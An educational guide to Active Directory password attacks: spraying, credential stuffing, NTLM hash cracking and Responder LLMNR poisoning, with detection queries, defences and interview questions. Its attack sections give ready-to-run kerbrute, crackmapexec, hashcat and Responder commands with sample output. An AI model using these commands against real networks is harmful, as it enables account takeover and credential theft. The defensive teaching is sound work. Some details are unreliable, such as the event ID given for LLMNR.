# 02 — Password Attacks

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Intermediate  
> **Goal:** Obtain valid credentials to gain initial access or escalate privileges

---

## 📌 Overview

Password attacks are often the **first step** in an AD compromise — gaining valid credentials to get a foothold or escalate from a low-privilege account.

There are four main types:

| Attack | Target | Speed | Detection Risk |
|--------|--------|-------|----------------|
| **Brute Force** | One account, many passwords | Slow | High (lockout) |
| **Dictionary Attack** | One account, wordlist | Medium | High (lockout) |
| **Password Spray** | Many accounts, few passwords | Slow (intentional) | Low |
| **Credential Stuffing** | Many accounts, breached passwords | Varies | Low-Medium |

---

## ⚙️ Attack 1 — Password Spraying

The most common attack against AD environments. Tries a small number of passwords across many accounts — staying under the lockout threshold.

### Why It Works

```
Company password policy:
  Lockout threshold: 5 attempts
  Common password season: Winter2024! (company name + year + !)

Attacker strategy:
  Try "Winter2024!" against ALL 500 domain accounts
  → 1 attempt per account → never hits lockout threshold
  → Even a 1% success rate = 5 compromised accounts
```

### Step-by-Step Attack

```powershell
# Step 1: Get list of domain users (from enumeration)
Get-ADUser -Filter * -Properties PasswordLastSet |
    Select-Object SamAccountName | Export-Csv users.txt

# Step 2: Identify password policy (how many attempts are safe?)
Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold
# Result: 5 → safe to try 3 passwords per account

# Step 3: Build password list
# Common patterns:
#   Season + Year: Spring2024!, Summer2024!, Winter2024!
#   Company name: Company2024!, Company@123
#   Common: Password1!, Welcome1!

# Step 4: Execute spray using Spray (PowerShell)
Import-Module .\Spray.ps1
Invoke-SprayEmptyPassword -DC DC01.company.local -Domain COMPANY

# Using Kerbrute (Kerberos-based — no LDAP lockout risk)
kerbrute passwordspray -d company.local --dc DC01.company.local \
    users.txt "Winter2024!"

# Using CrackMapExec (SMB spray)
crackmapexec smb DC01.company.local -u users.txt -p "Winter2024!" \
    --continue-on-success

# Step 5: Check results
# CrackMapExec output:
# SMB  192.168.1.10  445  DC01  [+] company.local\finance01:Winter2024! ← SUCCESS
```

### Real Scenario

```
Attacker targets company.local (500 employees)

Reconnaissance:
  Company name: Acme Corp
  LinkedIn: "Acme Corp is hiring for Q1 2024"
  → Guessed password: Acme2024!

Spray execution:
  3 attempts per account (threshold is 5)
  Passwords tried: Acme2024!, Acme@2024, Welcome1!
  
Results after spray:
  finance01@company.local : Acme2024! ← SUCCESS
  hr.smith@company.local  : Welcome1! ← SUCCESS
  
Attacker now has 2 valid accounts → enumeration begins
```

---

## ⚙️ Attack 2 — Credential Stuffing

Uses leaked username/password pairs from public data breaches against AD accounts.

```
Many users reuse passwords across personal and work accounts.

Step 1: Download breach databases
  HaveIBeenPwned exports, dark web credential dumps
  Example: "LinkedIn 2016 breach — 117M credentials"

Step 2: Filter for company email addresses
  grep "@company.com" linkedin_breach.txt > company_targets.txt

Step 3: Try those exact username:password pairs
  crackmapexec smb DC01.company.local -u company_targets.txt \
      -p company_passwords.txt --no-bruteforce

Why it works:
  User created LinkedIn with: hareesh@gmail.com / MyPet@2016
  Uses same password for work: hareesh@company.com / MyPet@2016 ← reuse
  Attacker tries breached password → works ✅
```

---

## ⚙️ Attack 3 — NTLM Hash Cracking (Offline)

When an attacker captures NTLM hashes (from DCSync, NTLM relay, or Responder), they crack them offline.

```bash
# Hashcat — GPU-accelerated cracking
# Mode 1000 = NTLM hashes

# Dictionary attack
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Dictionary + rules (much more effective)
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r rules/best64.rule

# Brute force (short passwords)
hashcat -m 1000 ntlm_hashes.txt -a 3 ?u?l?l?l?d?d?d?d

# Combinator attack (two wordlists combined)
hashcat -m 1000 ntlm_hashes.txt -a 1 words1.txt words2.txt

# Common cracking speeds (GPU: RTX 3090):
# NTLM: ~100 BILLION hashes/second ← extremely fast
# bcrypt: ~50,000 hashes/second ← extremely slow (why bcrypt is good)
# NTLMv2: ~5 BILLION hashes/second
```

---

## ⚙️ Attack 4 — Capturing Hashes with Responder

Responder poisons LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes from network traffic.

```bash
# Step 1: Run Responder on the network
python3 Responder.py -I eth0 -rdwv

# Step 2: Wait for a victim
# Hareesh tries to access \\FileServe1\Share (typo — server doesn't exist)
# Windows broadcasts LLMNR: "Who is FileServe1?"
# Responder responds: "I am FileServe1!"
# Hareesh's PC sends NTLMv2 authentication to Responder

# Responder captures:
[SMB] NTLMv2-SSP Client   : 192.168.1.45
[SMB] NTLMv2-SSP Username : COMPANY\hareesh
[SMB] NTLMv2-SSP Hash     : hareesh::COMPANY:abc123:...
      (NTLMv2 challenge-response hash)

# Step 3: Crack the captured hash
hashcat -m 5600 captured_hashes.txt rockyou.txt
# Mode 5600 = NTLMv2 (NetNTLMv2)

# If cracked: hareesh:Str0ng@Pass2024
# Attacker now has Hareesh's cleartext password ✅
```

---

## 🏢 Real-World Impact Scenario

```
Attacker runs Responder on company network for 2 hours:

Captured hashes:
  → hareesh (IT Admin) — NTLMv2 hash
  → finance01 (Finance user) — NTLMv2 hash  
  → gp-t1 (IT Manager Tier 1) — NTLMv2 hash ← valuable

Hashcat results (4 hours):
  → finance01 : Company@2022 ← cracked (weak)
  → hareesh   : IT@dmin2023! ← cracked (medium)
  → gp-t1     : [not cracked] ← strong password

With hareesh's credentials:
  → Can now enumerate domain as authenticated user
  → Can attempt Kerberoasting
  → Has local admin on IT machines → lateral movement
  
With finance01:
  → Access to Finance file shares
  → Potential access to financial data
```

---

## 🔍 Detection

```
Password Spray Detection — Event ID 4625 pattern:
  Many failed logins across DIFFERENT accounts from the SAME source IP
  
  Normal brute force:   Account A: 100 failures (lockout triggers)
  Password spray:       Account A: 3 failures
                        Account B: 3 failures
                        Account C: 3 failures
                        ... (50 accounts, 3 failures each)
  → No single lockout, but pattern is unmistakable

KQL Query for Sentinel:
  SecurityEvent
  | where EventID == 4625
  | where TimeGenerated > ago(1h)
  | summarize FailedAccounts=dcount(TargetAccount),
              FailureCount=count()
    by IpAddress, bin(TimeGenerated, 5m)
  | where FailedAccounts > 10
  | order by FailedAccounts desc
  
  Alert threshold: >10 distinct accounts failing from same IP in 5 minutes

Responder/LLMNR Detection:
  Event ID 5136 — LLMNR query
  Network monitoring: multiple LLMNR responses from same IP
  MDI: "LLMNR/NBT-NS poisoning and relay attack"

Credential Stuffing Detection:
  Successful logins from new/unusual locations
  Azure AD Identity Protection: "Unfamiliar sign-in properties"
  Many failed logins followed by one success = stuffing

Key Event IDs:
  4625 — Failed logon (SubStatus: 0xC000006A = wrong password)
  4624 — Successful logon (after failures = possible success after spray)
  4740 — Account locked out
  4771 — Kerberos pre-auth failed (Kerberos spray)
```

---

## 🛡️ Defence

```
1. MFA — The most effective single control
   Even if password is cracked → MFA blocks access
   Any spray/stuffing success is useless without MFA ✅

2. Disable LLMNR and NetBIOS-NS (stops Responder)
   GPO: Computer Config → Admin Templates → Network → DNS Client
   → Turn off multicast name resolution: Enabled
   
   Registry: HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters
   NodeType = 2

3. Smart lockout policy
   Azure AD Smart Lockout: locks after unusual failure patterns
   On-prem: Account lockout after 5 attempts
   
4. Password Blacklisting
   Azure AD Password Protection: blocks commonly used passwords
   Can be extended to on-prem AD
   Blocks: Company name variants, seasonal patterns, common passwords
   
5. Breach password monitoring
   Integrate HaveIBeenPwned API
   Alert when user's password appears in a breach
   Force password reset immediately

6. Conditional Access
   Block logins from known bad IP ranges (Tor, VPN services)
   Require MFA from new locations
   
7. Strong password requirements
   Minimum 14 characters for users
   Minimum 20 characters for admins
   Fine-Grained Password Policies (Section 04-05)

8. Monitor and alert
   Set baseline for normal failed login rate
   Alert when rate exceeds baseline by 3x
   Immediate alert on any Domain Admin failed logins
```

---

## 🎯 Interview Questions

**Q1. What is a password spray attack and how is it different from brute force?**  
**A:** Brute force tries many passwords against one account — it quickly hits the lockout threshold and is easily detected. Password spraying tries one or a few common passwords against many accounts — staying under the lockout threshold for each individual account. It is harder to detect because no single account shows an unusual failure count. Detection requires correlating failures across multiple accounts from the same source.

---

**Q2. What is Responder and how does it capture credentials?**  
**A:** Responder is a tool that poisons LLMNR (Link-Local Multicast Name Resolution) and NetBIOS-NS broadcasts. When a Windows machine tries to resolve a hostname that DNS cannot find, it falls back to broadcasting LLMNR. Responder responds to these broadcasts claiming to be the requested host — causing the victim's machine to send NTLMv2 authentication. Responder captures the challenge-response hash, which can then be cracked offline. Defence: disable LLMNR and NetBIOS-NS via GPO.

---

**Q3. Why is NTLM so much faster to crack than bcrypt?**  
**A:** NTLM is an unsalted MD4 hash — it was designed for speed, not security. A modern GPU can compute 100 billion NTLM hashes per second. bcrypt is deliberately slow — it uses a configurable work factor that limits computation to thousands of hashes per second. For passwords under 8-10 characters, NTLM is crackable in minutes to hours. bcrypt with a strong work factor would take years for the same password. This is why Windows stores domain password hashes as NTLM — a legacy design decision with serious security consequences.

---

**Q4. Scenario — Security monitoring detects 300 failed logins across 150 different accounts in 10 minutes, all from IP 185.220.x.x. All failures used the password "Autumn2024!". What is happening and what do you do?**  
**A:** This is a password spray attack from an external Tor/VPN IP. Actions: (1) Immediately block 185.220.x.x at the perimeter firewall. (2) Check if any accounts had a successful login (4624) after the failures — those are compromised. (3) Disable any accounts that were successfully authenticated from that IP. (4) Force MFA re-registration for those accounts (attacker may have registered their own MFA device if they got in first). (5) Check what the successful accounts accessed after login. (6) Implement Azure AD Smart Lockout if not already enabled. (7) Add the IP range to Conditional Access named locations and block all sign-ins from it.

---

*"Password spray is the digital equivalent of trying the same master key on every lock in a building. Most locks will not open — but in an organisation of 500 people, even one person using 'Winter2024!' is enough to open the door."*
